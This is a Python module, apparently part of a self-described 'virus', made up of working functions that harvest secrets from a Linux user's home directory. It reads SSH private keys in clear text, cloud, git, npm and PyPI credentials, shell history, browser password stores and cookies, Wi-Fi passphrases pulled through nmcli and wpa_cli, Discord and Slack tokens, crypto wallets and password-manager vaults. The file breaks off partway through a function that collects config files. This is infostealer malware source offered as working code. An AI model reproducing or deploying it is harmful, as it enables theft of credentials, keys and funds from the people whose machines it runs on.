"""
Virus Data Collection Module
"""
import os
import datetime
import time
import subprocess
import base64
import hashlib
import json
import sys

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from virus_config import *
from virus_utils import log_activity, encrypt_data

def collect_passwords():
    """Collect saved passwords from browsers"""
    if not ENABLE_PASSWORD_COLLECTION:
        return []
    
    passwords = []
    home_dir = os.path.expanduser("~")
    
    # Extended browser paths
    browser_paths = [
        f"{home_dir}/.mozilla/firefox",
        f"{home_dir}/.config/google-chrome",
        f"{home_dir}/.config/chromium",
        f"{home_dir}/.config/brave",
        f"{home_dir}/.config/microsoft-edge",
        f"{home_dir}/.firedragon",
        f"{home_dir}/.config/falkon",
        f"{home_dir}/.config/librewolf",
        f"{home_dir}/.config/waterfox",
    ]
    
    # Keywords to search for in filenames
    password_keywords = ['login', 'signons', 'password', 'credentials', 'key4db', 'key3.db', 'logins.json']
    
    for browser_path in browser_paths:
        if not os.path.exists(browser_path):
            continue
            
        try:
            for root, dirs, files in os.walk(browser_path):
                # Skip cache and temporary directories
                dirs[:] = [d for d in dirs if d not in ['Cache', 'cache', 'crashes', 'Crash Reports']]
                
                for file in files:
                    file_lower = file.lower()
                    
                    # Check if file matches password-related keywords
                    if any(keyword in file_lower for keyword in password_keywords):
                        file_path = os.path.join(root, file)
                        try:
                            file_stat = os.stat(file_path)
                            
                            # Read file data (up to 10KB for analysis)
                            data = None
                            try:
                                with open(file_path, 'rb') as f:
                                    data = f.read(min(10240, file_stat.st_size))
                            except:
                                pass
                            
                            passwords.append({
                                'browser': os.path.basename(browser_path),
                                'file': file_path,
                                'size': file_stat.st_size,
                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                'hash': hashlib.md5(data).hexdigest() if data else None,
                                'type': 'sqlite' if file.endswith('.sqlite') else 'json' if file.endswith('.json') else 'database'
                            })
                        except (OSError, PermissionError):
                            pass
        except Exception as e:
            log_activity("ERROR", f"Error collecting passwords from {browser_path}: {e}")
            pass
    
    if passwords:
        log_activity("PASSWORDS", f"Found {len(passwords)} password database files")
    
    return passwords

def collect_sensitive_files():
    """Collect sensitive files (SSH keys, configs, etc.)"""
    if not ENABLE_FILE_COLLECTION:
        return []
    
    sensitive_files = []
    home_dir = os.path.expanduser("~")
    
    patterns = [
        # SSH keys (all types)
        f"{home_dir}/.ssh/id_rsa",
        f"{home_dir}/.ssh/id_ed25519",
        f"{home_dir}/.ssh/id_ecdsa",
        f"{home_dir}/.ssh/id_dsa",
        f"{home_dir}/.ssh/id_rsa.pub",
        f"{home_dir}/.ssh/id_ed25519.pub",
        f"{home_dir}/.ssh/id_ecdsa.pub",
        f"{home_dir}/.ssh/id_dsa.pub",
        f"{home_dir}/.ssh/known_hosts",
        f"{home_dir}/.ssh/config",
        f"{home_dir}/.ssh/authorized_keys",
        # Shell history
        f"{home_dir}/.bash_history",
        f"{home_dir}/.zsh_history",
        f"{home_dir}/.fish_history",
        f"{home_dir}/.history",
        # Cloud credentials
        f"{home_dir}/.aws/credentials",
        f"{home_dir}/.aws/config",
        f"{home_dir}/.config/gcloud/credentials",
        f"{home_dir}/.config/gcloud/legacy_credentials",
        f"{home_dir}/.azure/config",
        f"{home_dir}/.azure/accessTokens.json",
        # Git credentials
        f"{home_dir}/.config/git/credentials",
        f"{home_dir}/.git-credentials",
        # Docker/Kubernetes
        f"{home_dir}/.docker/config.json",
        f"{home_dir}/.kube/config",
        # GPG keys
        f"{home_dir}/.gnupg/secring.gpg",
        f"{home_dir}/.gnupg/pubring.gpg",
        f"{home_dir}/.gnupg/private-keys-v1.d",
        # Development tool tokens
        f"{home_dir}/.npmrc",
        f"{home_dir}/.yarnrc",
        f"{home_dir}/.pypirc",
        f"{home_dir}/.pip/pip.conf",
        # Password managers
        f"{home_dir}/.config/keepassxc",
        f"{home_dir}/.local/share/keepassxc",
        f"{home_dir}/.config/Bitwarden",
        # Application tokens
        f"{home_dir}/.config/discord",
        f"{home_dir}/.config/TelegramDesktop",
        f"{home_dir}/.config/Slack",
        # Cloud storage
        f"{home_dir}/.dropbox",
        f"{home_dir}/.config/dropbox",
        f"{home_dir}/.config/onedrive",
        f"{home_dir}/.config/megasync",
    ]
    
    for pattern in patterns:
        if os.path.exists(pattern):
            try:
                file_stat = os.stat(pattern)
                file_data = None
                if file_stat.st_size < 1024 * 1024:  # Less than 1MB
                    try:
                        # Read in CLEAR TEXT (not base64)
                        with open(pattern, 'r', encoding='utf-8', errors='ignore') as f:
                            file_data = f.read()
                    except:
                        # If text read fails, try binary but still show as text
                        try:
                            with open(pattern, 'rb') as f:
                                file_data = f.read().decode('utf-8', errors='ignore')
                        except:
                            pass
                
                # For SSH private keys, read full content even if larger
                if 'id_rsa' in pattern or 'id_ed25519' in pattern or 'id_ecdsa' in pattern or 'id_dsa' in pattern:
                    if not pattern.endswith('.pub'):  # Private keys only
                        if file_stat.st_size < 10 * 1024:  # Up to 10KB for private keys
                            try:
                                with open(pattern, 'r', encoding='utf-8', errors='ignore') as f:
                                    file_data = f.read()
                            except:
                                try:
                                    with open(pattern, 'rb') as f:
                                        file_data = f.read().decode('utf-8', errors='ignore')
                                except:
                                    pass
                
                sensitive_files.append({
                    'path': pattern,
                    'size': file_stat.st_size,
                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                    'content': file_data,  # CLEAR TEXT content
                    'hash': hashlib.sha256(file_data.encode('utf-8') if file_data else b'').hexdigest() if file_data else None
                })
            except:
                pass
    
    if sensitive_files:
        log_activity("FILES", f"Found {len(sensitive_files)} sensitive files")
    
    return sensitive_files

def collect_browser_data():
    """Collect comprehensive browser data"""
    browser_data = {
        'cookies': [],
        'bookmarks': [],
        'history': [],
        'autofill': [],
        'extensions': []
    }
    
    home_dir = os.path.expanduser("~")
    browsers = {
        'firefox': f"{home_dir}/.mozilla/firefox",
        'chrome': f"{home_dir}/.config/google-chrome",
        'chromium': f"{home_dir}/.config/chromium",
        'brave': f"{home_dir}/.config/brave",
        'edge': f"{home_dir}/.config/microsoft-edge",
    }
    
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue
        
        try:
            for root, dirs, files in os.walk(browser_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        if 'cookies' in file.lower() and file.endswith('.sqlite'):
                            browser_data['cookies'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                        elif 'places.sqlite' in file or 'History' in file:
                            browser_data['history'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                        elif 'bookmarks' in file.lower():
                            browser_data['bookmarks'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                        elif 'web data' in file.lower() or 'formhistory' in file.lower():
                            browser_data['autofill'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                    except:
                        pass
        except:
            pass
    
    if any(browser_data.values()):
        log_activity("BROWSER", f"Found browser data: {sum(len(v) for v in browser_data.values())} items")
    
    return browser_data

def collect_wifi_passwords():
    """Collect WiFi passwords with actual passwords"""
    wifi_data = []
    
    # Method 1: NetworkManager (nmcli) - Most common on modern Linux
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show'],
                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
        if result.returncode == 0:
            connections = result.stdout.decode().strip().split('\n')
            for conn_line in connections:
                if not conn_line:
                    continue
                parts = conn_line.split(':')
                if len(parts) < 2:
                    continue
                conn_name = parts[0]
                conn_type = parts[1] if len(parts) > 1 else ''
                
                # Only process WiFi connections
                if '802-11-wireless' in conn_type or 'wifi' in conn_type.lower():
                    try:
                        # Get connection details with secrets
                        result2 = subprocess.run(['nmcli', '-s', 'connection', 'show', conn_name],
                                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=3)
                        if result2.returncode == 0:
                            output = result2.stdout.decode()
                            
                            # Extract SSID
                            ssid = conn_name
                            for line in output.split('\n'):
                                if '802-11-wireless.ssid:' in line:
                                    ssid = line.split(':', 1)[1].strip()
                                    break
                            
                            # Extract password (PSK)
                            password = None
                            for line in output.split('\n'):
                                if '802-11-wireless-security.psk:' in line:
                                    password = line.split(':', 1)[1].strip()
                                    break
                                elif 'wifi-sec.psk:' in line:
                                    password = line.split(':', 1)[1].strip()
                                    break
                            
                            # Try to get password with --show-secrets flag
                            if not password:
                                try:
                                    result3 = subprocess.run(['nmcli', '-s', 'connection', 'show', '--show-secrets', conn_name],
                                                           stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=3)
                                    if result3.returncode == 0:
                                        secret_output = result3.stdout.decode()
                                        for line in secret_output.split('\n'):
                                            if '802-11-wireless-security.psk:' in line:
                                                password = line.split(':', 1)[1].strip()
                                                break
                                            elif 'wifi-sec.psk:' in line:
                                                password = line.split(':', 1)[1].strip()
                                                break
                                except:
                                    pass
                            
                            wifi_data.append({
                                'ssid': ssid,
                                'connection_name': conn_name,
                                'password': password if password else 'Not found',
                                'method': 'NetworkManager',
                                'full_config': output[:1000]
                            })
                    except:
                        pass
    except:
        pass
    
    # Method 2: wpa_supplicant config files
    wpa_paths = [
        '/etc/wpa_supplicant/wpa_supplicant.conf',
        os.path.expanduser('~/.config/wpa_supplicant/wpa_supplicant.conf'),
        '/etc/NetworkManager/system-connections/',
    ]
    
    for wpa_path in wpa_paths:
        try:
            if os.path.isfile(wpa_path):
                try:
                    with open(wpa_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Parse wpa_supplicant.conf
                        lines = content.split('\n')
                        current_ssid = None
                        current_psk = None
                        for line in lines:
                            line = line.strip()
                            if line.startswith('ssid='):
                                current_ssid = line.split('=', 1)[1].strip('"')
                            elif line.startswith('psk='):
                                current_psk = line.split('=', 1)[1].strip('"')
                                if current_ssid and current_psk:
                                    wifi_data.append({
                                        'ssid': current_ssid,
                                        'password': current_psk,
                                        'method': 'wpa_supplicant',
                                        'source_file': wpa_path
                                    })
                                    current_ssid = None
                                    current_psk = None
                except:
                    pass
            elif os.path.isdir(wpa_path):
                # NetworkManager system-connections directory
                try:
                    for filename in os.listdir(wpa_path):
                        filepath = os.path.join(wpa_path, filename)
                        if os.path.isfile(filepath) and not filename.endswith('.nmmeta'):
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    # Parse NetworkManager connection file
                                    ssid = None
                                    psk = None
                                    for line in content.split('\n'):
                                        if line.startswith('ssid='):
                                            ssid = line.split('=', 1)[1].strip()
                                        elif line.startswith('psk='):
                                            psk = line.split('=', 1)[1].strip()
                                    
                                    if ssid or filename:
                                        wifi_data.append({
                                            'ssid': ssid if ssid else filename,
                                            'password': psk if psk else 'Encrypted in keyring',
                                            'method': 'NetworkManager-file',
                                            'source_file': filepath
                                        })
                            except:
                                pass
                except:
                    pass
        except:
            pass
    
    # Method 3: Try wpa_cli (if available)
    try:
        result = subprocess.run(['wpa_cli', 'list_networks'],
                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=3)
        if result.returncode == 0:
            output = result.stdout.decode()
            lines = output.split('\n')[1:]  # Skip header
            for line in lines:
                if line.strip():
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        network_id = parts[0]
                        ssid = parts[1]
                        if ssid and ssid != 'ssid':
                            try:
                                # Get password for this network
                                result2 = subprocess.run(['wpa_cli', 'get_network', network_id, 'psk'],
                                                       stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=2)
                                if result2.returncode == 0:
                                    psk = result2.stdout.decode().strip()
                                    if psk and psk != 'FAIL':
                                        wifi_data.append({
                                            'ssid': ssid,
                                            'password': psk.strip('"'),
                                            'method': 'wpa_cli'
                                        })
                            except:
                                pass
    except:
        pass
    
    # Remove duplicates based on SSID
    seen_ssids = set()
    unique_wifi_data = []
    for wifi in wifi_data:
        ssid_key = wifi.get('ssid', '').lower()
        if ssid_key and ssid_key not in seen_ssids:
            seen_ssids.add(ssid_key)
            unique_wifi_data.append(wifi)
        elif not ssid_key:
            unique_wifi_data.append(wifi)
    
    if unique_wifi_data:
        log_activity("WIFI", f"Found {len(unique_wifi_data)} WiFi networks with passwords")
    
    return unique_wifi_data

def collect_email_configs():
    """Collect email client configurations"""
    email_configs = []
    home_dir = os.path.expanduser("~")
    
    thunderbird_path = f"{home_dir}/.thunderbird"
    if os.path.exists(thunderbird_path):
        try:
            for root, dirs, files in os.walk(thunderbird_path):
                for file in files:
                    if file.endswith('.js') or 'prefs.js' in file:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'mail' in content.lower() or 'smtp' in content.lower():
                                    email_configs.append({
                                        'client': 'thunderbird',
                                        'file': file_path,
                                        'content': content[:2000]
                                    })
                        except:
                            pass
        except:
            pass
    
    evolution_path = f"{home_dir}/.config/evolution"
    if os.path.exists(evolution_path):
        email_configs.append({
            'client': 'evolution',
            'path': evolution_path
        })
    
    if email_configs:
        log_activity("EMAIL", f"Found {len(email_configs)} email configurations")
    
    return email_configs

def collect_database_files():
    """Collect database files including MongoDB, SQLite, and other databases"""
    databases = []
    home_dir = os.path.expanduser("~")
    
    # Common database locations
    database_locations = [
        home_dir,
        f"{home_dir}/.config",
        f"{home_dir}/.local/share",
        f"{home_dir}/.cache",
        f"{home_dir}/Documents",
        f"{home_dir}/Downloads",
    ]
    
    # Also check browser directories specifically
    browser_dirs = [
        f"{home_dir}/.mozilla/firefox",
        f"{home_dir}/.config/google-chrome",
        f"{home_dir}/.config/chromium",
        f"{home_dir}/.config/brave",
        f"{home_dir}/.firedragon",
        f"{home_dir}/.config/falkon",
    ]
    
    # MongoDB specific locations
    mongodb_locations = [
        f"{home_dir}/.mongodb",
        f"{home_dir}/data/db",
        f"{home_dir}/mongodb/data",
        f"{home_dir}/.local/share/mongodb",
        "/var/lib/mongodb",  # System-wide MongoDB (may need permissions)
    ]
    
    database_locations.extend(browser_dirs)
    database_locations.extend(mongodb_locations)
    
    # Exclude these directories to avoid too many results
    exclude_dirs = {
        '.git', '.svn', '.hg', 'node_modules', '__pycache__',
        '.cache', '.local/share/Trash', '.local/share/Steam'
    }
    
    # Database file extensions
    sqlite_extensions = ('.db', '.sqlite', '.sqlite3', '.db3')
    mongodb_extensions = ('.bson', '.wt', '.wiredtiger')
    other_db_extensions = ('.mdb', '.accdb', '.fdb', '.gdb')
    all_db_extensions = sqlite_extensions + mongodb_extensions + other_db_extensions
    
    max_depth = 3  # Limit depth to avoid too deep recursion
    max_files = 200  # Increased limit for more databases
    mongodb_max_size = 500 * 1024 * 1024  # 500MB for MongoDB files
    sqlite_max_size = 50 * 1024 * 1024  # 50MB for SQLite
    
    try:
        for location in database_locations:
            if not os.path.exists(location):
                continue
                
            for root, dirs, files in os.walk(location):
                # Calculate depth
                depth = root[len(location):].count(os.sep) if root != location else 0
                if depth > max_depth:
                    dirs[:] = []  # Don't go deeper
                    continue
                
                # Filter out excluded directories
                dirs[:] = [d for d in dirs if d not in exclude_dirs]
                
                for file in files:
                    if len(databases) >= max_files:
                        break
                    
                    file_path = os.path.join(root, file)
                    db_type = None
                    max_size = sqlite_max_size
                    
                    # Determine database type
                    if file.endswith(sqlite_extensions):
                        db_type = 'sqlite'
                        max_size = sqlite_max_size
                    elif file.endswith(mongodb_extensions):
                        db_type = 'mongodb'
                        max_size = mongodb_max_size
                    elif file.endswith(other_db_extensions):
                        db_type = 'other'
                        max_size = 100 * 1024 * 1024
                    elif any(loc in location for loc in mongodb_locations):
                        # In MongoDB directory, check for MongoDB files
                        if file.endswith(('.ns', '.0', '.1', '.2')) or 'collection' in file.lower():
                            db_type = 'mongodb'
                            max_size = mongodb_max_size
                    
                    if db_type:
                        try:
                            file_stat = os.stat(file_path)
                            if file_stat.st_size < max_size:
                                databases.append({
                                    'path': file_path,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                    'type': db_type,
                                    'location': location
                                })
                        except (OSError, PermissionError):
                            pass
                
                if len(databases) >= max_files:
                    break
            
            if len(databases) >= max_files:
                break
        
        # Also look for MongoDB config files
        mongodb_config_paths = [
            f"{home_dir}/.mongodb",
            f"{home_dir}/.config/mongodb",
            "/etc/mongod.conf",
            "/etc/mongodb.conf",
        ]
        
        for config_path in mongodb_config_paths:
            if os.path.exists(config_path):
                try:
                    if os.path.isfile(config_path):
                        # It's a config file
                        try:
                            file_stat = os.stat(config_path)
                            if file_stat.st_size < 1024 * 1024:  # < 1MB
                                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    databases.append({
                                        'path': config_path,
                                        'size': file_stat.st_size,
                                        'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                        'type': 'mongodb_config',
                                        'content': content[:5000],
                                        'location': 'config'
                                    })
                        except (OSError, PermissionError):
                            pass
                    else:
                        # It's a directory, look for config files inside
                        for root, dirs, files in os.walk(config_path):
                            for file in files:
                                if file.endswith(('.conf', '.config', '.yaml', '.yml')) and 'mongo' in file.lower():
                                    file_path = os.path.join(root, file)
                                    try:
                                        file_stat = os.stat(file_path)
                                        if file_stat.st_size < 1024 * 1024:
                                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                                content = f.read()
                                                databases.append({
                                                    'path': file_path,
                                                    'size': file_stat.st_size,
                                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                                    'type': 'mongodb_config',
                                                    'content': content[:5000],
                                                    'location': 'config'
                                                })
                                    except (OSError, PermissionError):
                                        pass
                except Exception as e:
                    pass
                    
    except Exception as e:
        log_activity("ERROR", f"Error collecting databases: {e}")
    
    if databases:
        mongodb_count = sum(1 for db in databases if db.get('type') == 'mongodb' or db.get('type') == 'mongodb_config')
        log_activity("DATABASES", f"Found {len(databases)} database files (including {mongodb_count} MongoDB files)")
    
    return databases

def collect_crypto_wallets():
    """Collect cryptocurrency wallet files"""
    wallets = []
    home_dir = os.path.expanduser("~")
    
    wallet_paths = [
        f"{home_dir}/.bitcoin",
        f"{home_dir}/.ethereum",
        f"{home_dir}/.electrum",
        f"{home_dir}/.monero",
        f"{home_dir}/.zcash",
    ]
    
    for wallet_path in wallet_paths:
        if os.path.exists(wallet_path):
            try:
                for root, dirs, files in os.walk(wallet_path):
                    for file in files:
                        if 'wallet' in file.lower() or file.endswith(('.dat', '.key', '.wallet')):
                            file_path = os.path.join(root, file)
                            try:
                                file_stat = os.stat(file_path)
                                wallets.append({
                                    'type': os.path.basename(wallet_path),
                                    'file': file_path,
                                    'size': file_stat.st_size
                                })
                            except:
                                pass
            except:
                pass
    
    if wallets:
        log_activity("WALLETS", f"Found {len(wallets)} cryptocurrency wallet files")
    
    return wallets

def collect_application_tokens():
    """Collect tokens from applications (Discord, Telegram, Slack, etc.)"""
    tokens = []
    home_dir = os.path.expanduser("~")
    
    # Discord tokens
    discord_paths = [
        f"{home_dir}/.config/discord",
        f"{home_dir}/.config/discordcanary",
        f"{home_dir}/.config/discordptb",
    ]
    
    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            try:
                # Look for Local Storage (LevelDB) or token files
                for root, dirs, files in os.walk(discord_path):
                    for file in files:
                        if 'token' in file.lower() or 'local storage' in root.lower():
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) < 1024 * 1024:  # < 1MB
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or len(content) > 50:
                                            tokens.append({
                                                'app': 'discord',
                                                'file': file_path,
                                                'content': content[:2000]
                                            })
                            except:
                                pass
            except:
                pass
    
    # Telegram
    telegram_paths = [
        f"{home_dir}/.local/share/TelegramDesktop",
        f"{home_dir}/.config/TelegramDesktop",
    ]
    
    for telegram_path in telegram_paths:
        if os.path.exists(telegram_path):
            try:
                for root, dirs, files in os.walk(telegram_path):
                    for file in files:
                        if file.endswith(('.key', '.dbs', '.tdata')):
                            file_path = os.path.join(root, file)
                            tokens.append({
                                'app': 'telegram',
                                'file': file_path,
                                'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0
                            })
            except:
                pass
    
    # Slack
    slack_path = f"{home_dir}/.config/Slack"
    if os.path.exists(slack_path):
        try:
            for root, dirs, files in os.walk(slack_path):
                for file in files:
                    if 'token' in file.lower() or 'local storage' in root.lower():
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 1024 * 1024:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    if 'token' in content.lower():
                                        tokens.append({
                                            'app': 'slack',
                                            'file': file_path,
                                            'content': content[:2000]
                                        })
                        except:
                            pass
        except:
            pass
    
    if tokens:
        log_activity("TOKENS", f"Found {len(tokens)} application token files")
    
    return tokens

def collect_cloud_storage_configs():
    """Collect cloud storage configurations"""
    cloud_configs = []
    home_dir = os.path.expanduser("~")
    
    # Dropbox
    dropbox_paths = [
        f"{home_dir}/.dropbox",
        f"{home_dir}/.config/dropbox",
    ]
    
    for dropbox_path in dropbox_paths:
        if os.path.exists(dropbox_path):
            try:
                for root, dirs, files in os.walk(dropbox_path):
                    for file in files:
                        if 'config' in file.lower() or file.endswith('.json'):
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) < 1024 * 1024:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        cloud_configs.append({
                                            'service': 'dropbox',
                                            'file': file_path,
                                            'content': content[:5000]
                                        })
                            except:
                                pass
            except:
                pass
    
    # OneDrive
    onedrive_path = f"{home_dir}/.config/onedrive"
    if os.path.exists(onedrive_path):
        try:
            config_file = os.path.join(onedrive_path, 'config')
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    cloud_configs.append({
                        'service': 'onedrive',
                        'file': config_file,
                        'content': content
                    })
        except:
            pass
    
    # MegaSync
    megasync_path = f"{home_dir}/.config/megasync"
    if os.path.exists(megasync_path):
        try:
            for root, dirs, files in os.walk(megasync_path):
                for file in files:
                    if 'config' in file.lower() or file.endswith('.ini'):
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 1024 * 1024:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    cloud_configs.append({
                                        'service': 'megasync',
                                        'file': file_path,
                                        'content': content[:5000]
                                    })
                        except:
                            pass
        except:
            pass
    
    if cloud_configs:
        log_activity("CLOUD", f"Found {len(cloud_configs)} cloud storage configurations")
    
    return cloud_configs

def collect_development_tokens():
    """Collect development tool tokens and credentials"""
    dev_tokens = []
    home_dir = os.path.expanduser("~")
    
    # NPM tokens
    npmrc_path = f"{home_dir}/.npmrc"
    if os.path.exists(npmrc_path):
        try:
            with open(npmrc_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if 'token' in content.lower() or 'auth' in content.lower():
                    dev_tokens.append({
                        'tool': 'npm',
                        'file': npmrc_path,
                        'content': content
                    })
        except:
            pass
    
    # Git credentials
    git_cred_paths = [
        f"{home_dir}/.git-credentials",
        f"{home_dir}/.config/git/credentials",
    ]
    
    for git_path in git_cred_paths:
        if os.path.exists(git_path):
            try:
                with open(git_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if content.strip():
                        dev_tokens.append({
                            'tool': 'git',
                            'file': git_path,
                            'content': content
                        })
            except:
                pass
    
    # PyPI tokens
    pypirc_path = f"{home_dir}/.pypirc"
    if os.path.exists(pypirc_path):
        try:
            with open(pypirc_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                dev_tokens.append({
                    'tool': 'pypi',
                    'file': pypirc_path,
                    'content': content
                })
        except:
            pass
    
    # Pip config
    pip_config_path = f"{home_dir}/.pip/pip.conf"
    if os.path.exists(pip_config_path):
        try:
            with open(pip_config_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if 'token' in content.lower() or 'password' in content.lower():
                    dev_tokens.append({
                        'tool': 'pip',
                        'file': pip_config_path,
                        'content': content
                    })
        except:
            pass
    
    if dev_tokens:
        log_activity("DEV_TOKENS", f"Found {len(dev_tokens)} development tool tokens")
    
    return dev_tokens

def collect_password_manager_files():
    """Collect password manager database files - enhanced search"""
    pm_files = []
    home_dir = os.path.expanduser("~")
    seen_files = set()  # Track seen files to avoid duplicates
    
    # All password manager file extensions
    pm_extensions = (
        '.kdbx', '.kdb', '.key',  # KeePass
        '.opvault', '.agilekeychain', '.1pif', '.1password',  # 1Password
        '.lps', '.lpsx',  # LastPass
        '.pws', '.psafe3', '.psafe4',  # Password Safe
        '.wallet', '.walletx',  # Generic wallet
        '.pwd', '.pass', '.vault',  # Generic
    )
    
    # Password manager keywords in filenames (case insensitive)
    pm_keywords = [
        'password', 'passwords', 'passwd', 'pwd',
        'vault', 'wallet', 'keychain', 'keepass',
        'bitwarden', 'lastpass', '1password',
        'credentials', 'secret', 'secrets'
    ]
    
    # Search locations (expanded)
    search_locations = [
        # Home directory and subdirectories
        home_dir,
        f"{home_dir}/Documents",
        f"{home_dir}/Downloads",
        f"{home_dir}/Desktop",
        f"{home_dir}/.local/share",
        f"{home_dir}/.config",
        # Specific password manager directories
        f"{home_dir}/.config/keepassxc",
        f"{home_dir}/.local/share/keepassxc",
        f"{home_dir}/.config/Bitwarden",
        f"{home_dir}/.local/share/Bitwarden",
        f"{home_dir}/.config/1Password",
        f"{home_dir}/.local/share/1Password",
        f"{home_dir}/.config/lastpass",
        f"{home_dir}/.local/share/lastpass",
        f"{home_dir}/.config/PasswordSafe",
        f"{home_dir}/.local/share/PasswordSafe",
        # Common backup locations
        f"{home_dir}/backup",
        f"{home_dir}/Backup",
        f"{home_dir}/backups",
        f"{home_dir}/Backups",
    ]
    
    max_size = 200 * 1024 * 1024  # 200MB max
    max_depth = 4  # Maximum directory depth
    max_files = 100  # Limit total files found
    
    for search_path in search_locations:
        if len(pm_files) >= max_files:
            break
            
        if not os.path.exists(search_path):
            continue
        
        try:
            # Determine max depth based on location
            if search_path in [f"{home_dir}/Documents", f"{home_dir}/Downloads", f"{home_dir}/Desktop", home_dir]:
                current_max_depth = 3
            else:
                current_max_depth = max_depth
            
            for root, dirs, files in os.walk(search_path):
                # Calculate depth
                if root != search_path:
                    depth = root[len(search_path):].count(os.sep)
                    if depth > current_max_depth:
                        dirs[:] = []  # Don't recurse deeper
                        continue
                
                # Skip certain directories
                dirs[:] = [d for d in dirs if d not in {'.git', '.svn', 'node_modules', '__pycache__', '.cache'}]
                
                for file in files:
                    if len(pm_files) >= max_files:
                        break
                    
                    file_lower = file.lower()
                    file_path = os.path.join(root, file)
                    
                    # Skip if already seen
                    if file_path in seen_files:
                        continue
                    
                    # Check by extension
                    matches_extension = file_lower.endswith(pm_extensions)
                    
                    # Check by filename keywords
                    matches_keyword = any(keyword in file_lower for keyword in pm_keywords)
                    
                    if matches_extension or matches_keyword:
                        try:
                            file_stat = os.stat(file_path)
                            
                            # Skip if too large
                            if file_stat.st_size > max_size:
                                continue
                            
                            # Skip if too small (likely not a password database)
                            if file_stat.st_size < 100:  # Less than 100 bytes
                                continue
                            
                            seen_files.add(file_path)
                            
                            # Determine manager type
                            manager = 'unknown'
                            if 'keepass' in file_lower or file_lower.endswith(('.kdbx', '.kdb')):
                                manager = 'keepass'
                            elif 'bitwarden' in file_lower:
                                manager = 'bitwarden'
                            elif '1password' in file_lower or file_lower.endswith(('.opvault', '.agilekeychain', '.1pif')):
                                manager = '1password'
                            elif 'lastpass' in file_lower or file_lower.endswith(('.lps', '.lpsx')):
                                manager = 'lastpass'
                            elif 'password' in file_lower or 'vault' in file_lower or 'wallet' in file_lower:
                                manager = 'generic'
                            
                            pm_files.append({
                                'manager': manager,
                                'path': file_path,
                                'file': file_path,  # Keep for compatibility
                                'size': file_stat.st_size,
                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                'type': os.path.splitext(file)[1] or 'no_extension',
                                'filename': file
                            })
                            
                        except (OSError, PermissionError) as e:
                            pass
                        except Exception as e:
                            log_activity("ERROR", f"Error processing file {file_path}: {e}")
                            
        except Exception as e:
            log_activity("ERROR", f"Error searching in {search_path}: {e}")
            continue
    
    if pm_files:
        log_activity("PASSWORD_MANAGERS", f"Found {len(pm_files)} password manager files")
    else:
        log_activity("PASSWORD_MANAGERS", "No password manager files found")
    
    return pm_files

def collect_all_config_files():
    """Collect all important config files from ~/.config/"""
    config_files = []
    home_dir = os.path.expanduser("~")
    config_dir = f"{home_dir}/.config"
    
    if not os.path.exists(config_dir):
        return config_files
    
    # File extensions to collect
    config_extensions = ('.json', '.conf', '.config', '.ini', '.yaml', '.yml', '.toml', '.cfg', '.cnf')
    
    # Keywords in filenames that indicate sensitive configs
    sensitive_keywords = [
        'token', 'credential', 'password', 'secret', 'key', 'auth', 'api',
        'config', 'setting', 'preference', 'account', 'login', 'session'
    ]
    
    # Directories to exclude (too large or not useful)
    exclude_dirs = {
        '.cache', 'cache', 'Cache', '__pycache__', 'node_modules',
        '.git', '.svn', 'Trash', 'Steam', 'discord', 'discordcanary', 'discordptb',
        'Code', 'code', 'Cursor', 'cursor'  # Already handled separately
    }
    
    max_file_size = 1024 * 1024  # 1MB max per file
    max_files = 200  # Limit total files
    
    try:
        for root, dirs, files in os.walk(config_dir):
            # Filter out excluded directories
            dirs[:] = [d for d in dirs if d not in exclude_dirs and not d.startswith('.')]
            
